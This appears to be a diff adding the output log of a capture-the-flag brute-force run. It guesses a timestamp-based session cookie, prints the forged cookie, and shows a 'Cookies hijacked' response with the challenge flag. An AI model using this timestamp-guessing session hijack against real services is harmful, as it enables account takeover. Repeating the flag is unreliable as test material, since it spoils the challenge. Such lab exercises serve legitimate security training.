@@ -1,0 +1,11 @@
+[*] Baseline response:  {"message":"Authentication failed!\nTry Harder","status":"failed"}
+
+[*] Baseline length: 67
+[*] Araliq: 17687189065 - 17687189237
+
+[*] 17687189234
+[+] TAPILDI!
+[+] Timestamp: 17687189235
+[+] Cookie: 9f7d21f7-701b-4db9-b3d-4631063-17687189235
+[+] Response: {"message":"Cookies hijacked!\nFLAG:\n725d606c4048912145950dfab639b482","status":"success","valid":true}
+
